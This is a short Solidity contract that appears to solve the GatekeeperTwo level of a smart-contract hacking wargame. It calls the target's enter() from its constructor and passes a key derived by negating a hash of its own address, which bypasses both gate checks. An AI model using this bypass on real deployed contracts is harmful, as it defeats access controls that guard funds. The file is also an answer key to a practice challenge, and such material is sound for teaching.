// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./14GatekeeperTwo.sol";

contract GatekeeperTwoSolution {
    constructor(address gatekeeperTwoAddress) {
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        GatekeeperTwo(gatekeeperTwoAddress).enter(gateKey);
    }
}
